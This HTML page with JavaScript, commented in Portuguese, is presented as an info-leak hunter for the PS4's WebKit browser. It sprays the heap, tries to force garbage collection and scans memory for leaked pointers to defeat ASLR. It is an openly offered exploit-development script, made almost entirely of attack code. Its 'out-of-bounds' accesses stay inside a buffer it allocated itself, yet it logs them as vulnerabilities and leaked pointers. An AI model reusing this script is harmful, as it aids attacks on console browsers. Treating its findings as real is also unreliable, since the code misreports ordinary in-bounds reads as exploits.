<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit PS4 Info Leak Hunter v2</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 85vh;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-critical { color: #f0f; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; }
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-spray { color: #9C27B0; } /* Roxo para logs de spray */
        .log-gc { color: #00BCD4; } /* Ciano para logs de GC */
        .log-debug { color: #795548; } /* Marrom para logs de debug */
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>WebKit PS4 Info Leak Hunter v2</h1>
    <p>Tenta Heap Spray/Grooming e OOB Read para obter um info leak no WebKit (PS4).</p>
    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak</button>
    <div id="output"></div>

    <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 250;
        const LONG_PAUSE = 500;
        let leakedValueFromOOB = null;
        let sprayObjectsContainer = []; // Para manter referências e evitar GC prematuro dos sprays

        const log = (message, type = 'info', funcName = '') => {
            if (!outputDiv) return;
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                const prefix = funcName ? `[${funcName}] ` : '';
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                const logClass = ['vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'spray', 'gc', 'debug'].includes(type) ? type : 'info';
                if(outputDiv.innerHTML.length > 1000000){ // Buffer de log maior
                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 500000);
                    outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
                }
                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            } catch(e) { console.error("Erro no logging:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
        };

        const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
        const toHex = (val, bits = 32) => {
            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
            let num = Number(val);
            if (bits <= 32) { num = num >>> 0; }
            const pad = Math.ceil(bits / 4);
            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        };

        // --- Técnicas de Spray ---
        const performArrayBufferSpray = (count = 0x100, size = 0x4000, patternHigh = 0x41414141, patternLow = 0x42424242) => {
            const FNAME = "performArrayBufferSpray";
            log(`Iniciando ArrayBuffer Spray: ${count} objetos de tamanho ${toHex(size)}...`, 'spray', FNAME);
            let localSprayStore = [];
            try {
                for (let i = 0; i < count; i++) {
                    let ab = new ArrayBuffer(size);
                    let view = new Uint32Array(ab);
                    for (let j = 0; j < view.length; j += 2) {
                        view[j] = patternLow; // Padrão ABAB ou similar
                        if (j + 1 < view.length) view[j+1] = patternHigh; // Padrão CDCD
                    }
                    localSprayStore.push(ab); // Manter referência
                }
                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore); // Adicionar ao container global
                log(`ArrayBuffer Spray concluído. Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
            } catch (e) {
                log(`Erro durante ArrayBuffer Spray: ${e.message}`, 'error', FNAME);
            }
        };

        const performDOMElementSpray = (count = 1000) => { // Reduzido para evitar lentidão excessiva
            const FNAME = "performDOMElementSpray";
            log(`Iniciando DOM Element Spray: ${count} elementos <div>...`, 'spray', FNAME);
            let localSprayStore = [];
            let tempContainer = document.createDocumentFragment(); // Usar fragmento para performance
            try {
                for (let i = 0; i < count; i++) {
                    let div = document.createElement('div');
                    div.id = `spray_div_${Date.now()}_${i}`;
                    // Adicionar alguns atributos e conteúdo pode influenciar o tamanho e a estrutura na memória
                    div.setAttribute('data-spray-id', i.toString());
                    div.textContent = `SprayPayload_${"A".repeat(32 + (i%10))}_${i}`; // Conteúdo variado
                    // Não adicionar ao DOM principal imediatamente para evitar lentidão, mas manter referência
                    localSprayStore.push(div);
                }
                // Para que os elementos sejam realmente processados pelo motor, pode ser necessário adicioná-los
                // a um elemento destacado do DOM ou brevemente ao DOM principal. Testar com cautela.
                // document.body.appendChild(tempContainer); // Pode ser muito lento ou crashar se count for grande
                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore);
                log(`DOM Element Spray concluído. Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
            } catch (e) {
                log(`Erro durante DOM Element Spray: ${e.message}`, 'error', FNAME);
            }
        };

        const performStringUnicodeSpray = (count = 0x100, lengthPerString = 0x1000) => {
            const FNAME = "performStringUnicodeSpray";
            log(`Iniciando String Unicode Spray: ${count} strings de tamanho aprox. ${lengthPerString*2}...`, 'spray', FNAME);
            let localSprayStore = [];
            // Pattern: \u4141\u4242 (AABB em bytes como UTF-16)
            // Cada caractere Unicode \uXXXX usa 2 bytes.
            // Para um padrão de 8 bytes (ex: um ponteiro) seria \u4141\u4242\u4343\u4444
            const patternUnit = "\u4141\u4242\u4343\u4444"; // AABBCCDD
            let baseString = "";
            for(let i = 0; i < Math.ceil(lengthPerString / (patternUnit.length)); i++){
                baseString += patternUnit;
            }

            try {
                for (let i = 0; i < count; i++) {
                    // Adicionar um pequeno identificador único no início ou fim da string pode ajudar
                    localSprayStore.push( `SPRAY_ID${i.toString().padStart(4,'0')}${baseString.substring(0, lengthPerString - 10)}`);
                }
                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore);
                log(`String Unicode Spray concluído. Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
            } catch (e) {
                log(`Erro durante String Unicode Spray: ${e.message}`, 'error', FNAME);
            }
        };

        const triggerGC = async () => {
            const FNAME = "triggerGC";
            log("Tentando induzir Garbage Collection...", 'gc', FNAME);
            try {
                // Técnica 1: Alocar e desreferenciar muitos objetos pequenos
                let temp = [];
                for (let i = 0; i < 10000; i++) { // Aumentado
                    temp.push(new Object());
                }
                temp = null;

                // Técnica 2: Alocar um ArrayBuffer grande e depois encolhê-lo (se suportado) ou desreferenciar
                // Algumas engines podem ter otimizações para ArrayBuffer.transfer ou resize.
                // No PS4, a disponibilidade/comportamento é incerta.
                if (typeof ArrayBuffer.transfer === 'function') { // Raro
                    let bigBoy = new ArrayBuffer(1024 * 1024 * 16); // 16MB
                     // bigBoy = ArrayBuffer.transfer(bigBoy, 0); // Tenta encolher para 0
                } else {
                    let bigBoy = new ArrayBuffer(1024 * 1024 * 16);
                    bigBoy = null;
                }
                 log("GC Inducement: Alocações/Desreferenciações feitas.", 'gc', FNAME);

                // Se window.gc estiver exposto (muito raro em ambientes de produção, mais comum em debug builds)
                if (typeof window.gc === 'function') {
                    log("window.gc() está disponível! Chamando...", 'gc', FNAME);
                    window.gc();
                    log("window.gc() chamado.", 'good', FNAME);
                } else {
                    log("window.gc() não está disponível.", 'warn', FNAME);
                }
            } catch (e) {
                log(`Erro ao tentar induzir GC: ${e.message}`, 'error', FNAME);
            }
            await PAUSE(MEDIUM_PAUSE); // Dar tempo para o GC (se acionado) rodar
        };


        // --- Função OOB Leak (com heurísticas relaxadas) ---
        const attemptOOBLeakInternal = async () => {
            const FNAME = 'attemptOOBLeakInternal';
            log("--- Iniciando Tentativa de Vazamento OOB (Interna) ---", 'test', FNAME);
            // Parâmetros para OOB
            const bufferSize = 32;
            const oobWriteOffset = bufferSize;
            const writeValue = 0xEE;
            const readRangeStart = -128; // Aumentar com cautela
            const readRangeEnd = bufferSize + 128; // Aumentar com cautela
            const allocationSize = bufferSize + 256 + Math.abs(readRangeStart) + 128; // Garantir espaço
            const baseOffsetInBuffer = Math.abs(readRangeStart) + 64;

            const oobReadOffsets = [];
            for (let i = readRangeStart; i < readRangeEnd; i += 1) { // Leitura byte a byte para máxima granularidade
                oobReadOffsets.push(i);
            }
            // oobReadOffsets.sort((a, b) => a - b); // Já está ordenado

            let writeSuccess = false;
            let potentialLeakFoundCount = 0;
            // leakedValueFromOOB é global

            // Heurística de ponteiro RELAXADA para PS4 WebKit (ajustar conforme necessário!)
            const isSanePointerCandidate64_PS4WebKit = (high, low, addressReadFrom) => {
                const FNAME_HC = "isSanePtr64_PS4";
                if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;

                // Filtros básicos
                if (high === 0 && low === 0) return false;
                if ((high === 0xFFFFFFFF && low === 0xFFFFFFFF) || (high === 0 && low === 0xFFFFFFFF) ) return false;
                // Adicionar mais padrões de preenchimento se observados
                if ((high === 0xBBBBBBBB && low === 0xBBBBBBBB) || (high === 0 && low === 0xBBBBBBBB) ) return false; // Nosso fill pattern
                if ((high === 0xCDCDCDCD && low === 0xCDCDCDCD) || (high === 0 && low === 0xCDCDCDCD) ) return false; // Comum em memória liberada

                // Heurística para PS4 (MUITO ESPECULATIVA - requer conhecimento real das faixas de memória do PS4)
                // Ponteiros no PS4 (Orbis OS) podem estar em regiões específicas.
                // Ex: Kernel geralmente acima de 0xFFFFFFFF80000000. Userspace abaixo disso.
                // WebKit JIT pode estar em uma faixa específica. Módulos do sistema também.
                // const PS4_KERNEL_BOUNDARY_HIGH = 0xFFFFFFFF; // Simplificado, só para high dword
                // if (high >= PS4_KERNEL_BOUNDARY_HIGH && low >= 0x80000000) return false; // Evitar kernel space óbvio

                // Ponteiros para código ou heap geralmente não são muito pequenos
                if (high === 0 && low < 0x100000) return false; // Abaixo de 1MB pode ser suspeito para código/heap

                // No PS4, muitos endereços de userspace começam com 0x0000000XXXXXXXXX ou 0xXXXXXXXXX
                // Se high for muito grande (ex: > 0x0000000F), pode ser suspeito para um ponteiro de userspace típico,
                // mas isso depende muito do mapeamento de memória.
                // A remoção do MAX_EXPECTED_USER_HIGH torna isso mais permissivo.
                log(`[DEBUG ${FNAME_HC}] Avaliando: H=${toHex(high)}, L=${toHex(low)}, LidoDe=${toHex(addressReadFrom)} -> Considerado POTENCIAL!`, 'debug', FNAME);
                return true;
            };

            const isSaneDataCandidate32_PS4WebKit = (val32) => {
                if (val32 === null || typeof val32 !== 'number') return false;
                val32 = val32 >>> 0;
                if (val32 === 0 || val32 === 0xFFFFFFFF || val32 === 0xBBBBBBBB || val32 === 0xCDCDCDCD) return false;
                if (val32 < 0x1000) return false;
                return true;
            };

            try {
                const buffer = new ArrayBuffer(allocationSize);
                const dataView = new DataView(buffer);
                for (let i = 0; i < buffer.byteLength; i++) {
                    dataView.setUint8(i, 0xBB);
                }

                const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                await PAUSE();
                try {
                    dataView.setUint8(writeTargetAddress, writeValue);
                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                    writeSuccess = true;
                } catch (e) {
                    log(`Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) FALHOU/Bloqueada: ${e.message}`, 'warn', FNAME);
                }
                await PAUSE();

                log(`Iniciando varredura de leitura OOB de ${readRangeStart} até ${readRangeEnd}. Total offsets: ${oobReadOffsets.length}`, 'info', FNAME);

                for (const readOffset of oobReadOffsets) {
                    const currentReadTargetAddress = baseOffsetInBuffer + readOffset;
                    const relOffsetStr = `@${readOffset} (abs addr in buffer: ${toHex(currentReadTargetAddress)})`;

                    if (currentReadTargetAddress >= 0 && (currentReadTargetAddress + 8) <= buffer.byteLength) {
                        try {
                            const low = dataView.getUint32(currentReadTargetAddress, true);
                            const high = dataView.getUint32(currentReadTargetAddress + 4, true);

                            if (isSanePointerCandidate64_PS4WebKit(high, low, currentReadTargetAddress)) {
                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
                                potentialLeakFoundCount++;
                                if (leakedValueFromOOB === null || leakedValueFromOOB.type === 'U32' || 
                                    (leakedValueFromOOB.type === 'U64' && (leakedValueFromOOB.high !== high || leakedValueFromOOB.low !== low))) { // Armazenar se for novo ou melhor
                                    leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset, addressReadFrom: currentReadTargetAddress };
                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                    log(` ---> *** ALERTA: Potencial Ponteiro U64 Vazado! ***`, 'escalation', FNAME);
                                }
                            }
                        } catch (e) { }
                    }

                    if (leakedValueFromOOB === null || leakedValueFromOOB.type !== 'U64') {
                        if (currentReadTargetAddress >= 0 && (currentReadTargetAddress + 4) <= buffer.byteLength) {
                            try {
                                const val32 = dataView.getUint32(currentReadTargetAddress, true);
                                if (isSaneDataCandidate32_PS4WebKit(val32)) {
                                    if (leakedValueFromOOB === null || (leakedValueFromOOB.type === 'U32' && leakedValueFromOOB.low !== val32) ) {
                                        log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
                                        potentialLeakFoundCount++;
                                        leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset, addressReadFrom: currentReadTargetAddress };
                                        log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                    }
                                }
                                if (readOffset === oobWriteOffset && (val32 & 0xFF) === writeValue) {
                                    log(` -> Leu parte do valor OOB escrito (${toHex(val32)}) ${relOffsetStr}.`, 'good', FNAME);
                                }
                            } catch (e) { }
                        }
                    }
                    if (readOffset % 128 === 0) await PAUSE(10); // Pausa mais longa para varreduras grandes
                }

            } catch (e) {
                log(`Erro FATAL na tentativa de leak OOB: ${e.message}`, 'critical', FNAME);
                console.error(e);
            } finally {
                let leakStatus = 'Nenhum valor promissor armazenado.';
                if (leakedValueFromOOB) {
                    leakStatus = `Melhor leak: ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} ` +
                                 `(Lido de buf addr ${toHex(leakedValueFromOOB.addressReadFrom)}) ` +
                                 (leakedValueFromOOB.type === 'U64' ? `H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}` : `Val=${toHex(leakedValueFromOOB.low)}`);
                }
                log(`--- Tentativa de Vazamento OOB (Interna) Concluída (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME);
            }
            return leakedValueFromOOB !== null;
        };


        // --- Orquestrador Principal ---
        const runAdvancedInfoLeakTest = async () => {
            const FNAME = 'runAdvancedInfoLeakTest';
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = '';
            leakedValueFromOOB = null; // Resetar a cada execução completa
            sprayObjectsContainer = []; // Limpar referências de sprays anteriores

            log("==== INICIANDO WebKit PS4 Info Leak Hunter v2 ====", 'test', FNAME);
            await PAUSE(MEDIUM_PAUSE);

            // Passo 1: Heap Spraying (experimente diferentes combinações e ordens)
            log("--- Fase 1: Heap Spraying ---", 'test', FNAME);
            performArrayBufferSpray(0x80, 0x4000); // Contagem reduzida para teste inicial, tamanho comum
            await PAUSE(MEDIUM_PAUSE);
            performStringUnicodeSpray(0x80, 2048); // Contagem e tamanho reduzidos
            await PAUSE(MEDIUM_PAUSE);
            // performDOMElementSpray(500); // DOM spray pode ser pesado, usar com cautela
            // await PAUSE(MEDIUM_PAUSE);

            // Passo 2: Tentar Induzir GC (para "assentar" o heap e potencialmente limpar freelists)
            log("--- Fase 2: Tentativa de Indução de GC ---", 'test', FNAME);
            await triggerGC();
            await PAUSE(LONG_PAUSE); // Pausa maior após GC

            // Passo 3: Tentar o Vazamento OOB
            log("--- Fase 3: Tentativa de Vazamento OOB ---", 'test', FNAME);
            await attemptOOBLeakInternal(); // Chama a função OOB interna

            // Passo 4: Reportar o melhor leak encontrado globalmente
            if (leakedValueFromOOB && leakedValueFromOOB.type === 'U64') {
                log(`RESULTADO FINAL: POTENCIAL PONTEIRO U64 PARA ANÁLISE ASLR: H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}`, 'CRITICAL', FNAME);
                alert(`Potencial Ponteiro U64 Encontrado!\nH: ${toHex(leakedValueFromOOB.high)}\nL: ${toHex(leakedValueFromOOB.low)}`);
            } else if (leakedValueFromOOB) {
                log(`RESULTADO FINAL: Leak U32 para análise: ${toHex(leakedValueFromOOB.low)}`, 'LEAK', FNAME);
                alert(`Leak U32 Encontrado: ${toHex(leakedValueFromOOB.low)}`);
            } else {
                log("RESULTADO FINAL: Nenhum ponteiro ou dado promissor foi vazado nesta execução.", 'warn', FNAME);
                alert("Nenhum leak promissor encontrado.");
            }

            log("\n==== WebKit PS4 Info Leak Hunter v2 CONCLUÍDO ====", 'test', FNAME);
            if (runBtn) runBtn.disabled = false;
        };

    </script>
</body>
</html>
